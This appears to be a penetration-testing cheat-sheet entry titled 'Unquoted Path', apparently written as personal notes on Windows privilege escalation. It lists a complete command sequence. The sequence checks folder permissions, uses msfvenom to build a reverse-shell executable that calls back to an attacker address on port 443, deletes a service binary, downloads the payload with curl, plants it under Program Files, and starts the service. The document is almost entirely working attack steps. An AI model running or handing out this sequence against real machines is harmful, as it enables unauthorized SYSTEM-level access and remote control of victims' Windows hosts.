# Unquoted Path

• Permission check and service stop / start check

• Msfvenom create shell and upload ( curl, iwr, certutil)

    • icacls "C:\Program Files"

    • msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.10 lport=443 -f exe -o rev.exe

    • del "C:\program files\noman\noman.exe"

    • curl 192.168.10.10/rev.exe -o noman.exe

    • cp noman.exe "C:\program files\noman\"

    • net start noman
